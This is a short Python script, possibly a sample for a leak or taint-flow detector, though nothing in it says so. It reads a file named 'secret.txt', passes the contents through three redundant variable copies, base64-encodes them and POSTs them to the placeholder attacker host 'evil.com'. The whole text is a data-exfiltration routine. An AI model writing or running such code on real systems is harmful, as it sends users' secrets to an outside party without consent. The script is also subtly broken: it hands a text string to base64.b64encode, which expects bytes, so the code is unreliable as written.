import base64
import requests

with open("secret.txt") as f:

    data = f.read()

a = data
b = a
c = b

encoded = base64.b64encode(c)

requests.post(
    "http://evil.com",
    data=encoded
)